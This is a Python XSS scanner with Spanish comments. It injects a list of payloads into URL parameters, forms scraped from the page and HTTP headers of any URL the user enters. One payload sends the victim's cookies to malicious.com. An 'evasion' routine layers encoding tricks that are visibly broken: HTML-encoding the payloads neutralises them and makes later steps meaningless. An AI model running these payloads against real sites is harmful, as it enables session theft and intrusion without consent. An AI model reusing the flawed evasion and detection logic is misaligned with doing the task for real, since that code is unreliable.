import requests
import time
import random
from urllib.parse import urlparse, parse_qs, urljoin
from bs4 import BeautifulSoup
import base64
import re

# Payloads básicos de XSS
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",  # XSS básico
    "<img src='x' onerror='alert(1)'>",  # XSS en eventos
    "<svg/onload=alert(1)>",  # SVG XSS
    "<iframe src='javascript:alert(1)'></iframe>",  # XSS en iframes
    "<body onload=alert(1)>",  # XSS en el body
    "<a href='javascript:alert(1)'>Click me</a>",  # XSS en enlaces
    "<input type='text' value=''><script>alert(1)</script>",  # XSS en inputs
    "<img src='x' onerror='document.location=\"http://malicious.com?cookie=\" + document.cookie'>",  # Exfiltración de cookies
    "');alert('XSS');//"  # XSS en parámetros de la URL
]

# Técnicas de evasión
def evade_payload(payload):
    """Aplica técnicas de evasión a los payloads de XSS."""
    
    # 1. Codificación HTML de caracteres especiales
    payload = payload.replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;").replace("'", "&#x27;")

    # 2. Codificación Base64 (para onerror o src)
    if "onerror" in payload or "src" in payload:
        encoded_payload = base64.b64encode(payload.encode()).decode('utf-8')
        payload = f"eval(atob('{encoded_payload}'))"

    # 3. Fragmentación de las cadenas
    payload = payload.replace("<", "<"+"%"+"2F"+"%3E")

    # 4. Uso de comentarios JavaScript (como evasión)
    payload = payload.replace("<script>", "<script><!--").replace("</script>", "//--> </script>")

    # 5. Variantes en eventos HTML
    payload = payload.replace("onerror", "onmouseover").replace("onload", "onfocus")

    return payload

# Cabeceras para las solicitudes HTTP
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Función para obtener la respuesta HTTP de una URL
def get_response(url):
    """Realiza una solicitud GET a la URL y devuelve la respuesta."""
    try:
        response = requests.get(url, headers=HEADERS)
        response.raise_for_status()
        return response
    except requests.exceptions.RequestException as e:
        print(f"Error al realizar la solicitud: {e}")
        return None

# Función para inyectar y probar un payload XSS en una URL
def test_xss_in_url(url, payload):
    """Inyecta un payload XSS en la URL y prueba la respuesta."""
    payload = evade_payload(payload)  # Aplicamos técnicas de evasión
    test_url = f"{url}?{random.randint(1000, 9999)}={payload}"
    print(f"Probando XSS en URL: {test_url}")
    response = get_response(test_url)
    if response and payload in response.text:
        print(f"¡Vulnerabilidad XSS reflejada detectada en la URL: {test_url}")
        return True
    return False

# Función para probar un XSS en parámetros de formularios
def test_xss_in_form(url, form_data, payload):
    """Prueba un payload XSS en formularios."""
    payload = evade_payload(payload)  # Aplicamos técnicas de evasión
    form_data[random.choice(list(form_data.keys()))] = payload
    response = requests.post(url, headers=HEADERS, data=form_data)
    if payload in response.text:
        print(f"¡Vulnerabilidad XSS almacenada detectada en el formulario de la URL: {url}")
        return True
    return False

# Función para extraer los formularios de una página
def extract_forms(url):
    """Extrae todos los formularios de una página."""
    response = get_response(url)
    if not response:
        return []
    
    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form')
    extracted_forms = []
    
    for form in forms:
        action = form.get('action', '')
        method = form.get('method', 'get').lower()
        inputs = form.find_all('input')
        
        form_data = {}
        for input_tag in inputs:
            name = input_tag.get('name')
            type_ = input_tag.get('type', 'text')
            value = input_tag.get('value', '')
            form_data[name] = value
        
        extracted_forms.append({
            'url': urljoin(url, action),
            'method': method,
            'data': form_data
        })
    
    return extracted_forms

# Función para inyectar un payload XSS en formularios
def inject_xss_in_forms(url):
    """Inyecta payloads XSS en formularios y prueba."""
    forms = extract_forms(url)
    for form in forms:
        for payload in XSS_PAYLOADS:
            if test_xss_in_form(form['url'], form['data'], payload):
                print(f"Vulnerabilidad XSS almacenada detectada en el formulario: {form['url']}")
                return True
    return False

# Función para verificar si la página contiene JavaScript vulnerable
def test_xss_in_script_tag(url):
    """Detecta la vulnerabilidad XSS en el código de la página."""
    response = get_response(url)
    if response and "<script>" in response.text:
        for payload in XSS_PAYLOADS:
            payload = evade_payload(payload)  # Aplicamos técnicas de evasión
            if payload in response.text:
                print(f"¡Vulnerabilidad XSS detectada en script de la URL: {url}")
                return True
    return False

# Función para probar la seguridad de las cabeceras HTTP
def test_xss_in_headers(url):
    """Inyecta payloads en las cabeceras HTTP para detectar XSS."""
    for payload in XSS_PAYLOADS:
        payload = evade_payload(payload)  # Aplicamos técnicas de evasión
        headers = HEADERS.copy()
        headers['X-Custom-Header'] = payload
        response = requests.get(url, headers=headers)
        if payload in response.text:
            print(f"¡Vulnerabilidad XSS detectada en la cabecera HTTP: {url}")
            return True
    return False

# Función para explorar diferentes tipos de XSS (reflejado, almacenado, DOM)
def explore_xss(url):
    """Explora diferentes tipos de XSS en una página."""
    print(f"\nExplorando la URL: {url}")
    
    # 1. XSS Reflejado (en la URL)
    print("\nProbando XSS Reflejado...")
    for payload in XSS_PAYLOADS:
        if test_xss_in_url(url, payload):
            print(f"¡XSS Reflejado detectado en la URL: {url}")
    
    # 2. XSS Almacenado (en formularios)
    print("\nProbando XSS Almacenado...")
    if inject_xss_in_forms(url):
        print(f"¡XSS Almacenado detectado en la URL: {url}")
    
    # 3. XSS en etiquetas de script
    print("\nProbando XSS en Scripts...")
    if test_xss_in_script_tag(url):
        print(f"¡XSS detectado en el código JavaScript de la URL: {url}")
    
    # 4. XSS en cabeceras HTTP
    print("\nProbando XSS en Cabeceras HTTP...")
    if test_xss_in_headers(url):
        print(f"¡XSS detectado en las cabeceras HTTP de la URL: {url}")
    
    print("\nExploración completa.")
    
# Función principal
def main():
    """Función principal que inicia el análisis de XSS."""
    print("Inicio de Análisis de XSS")
    url = input("\nIntroduce la URL que deseas analizar: ").strip()
    explore_xss(url)

if __name__ == "__main__":
    main()
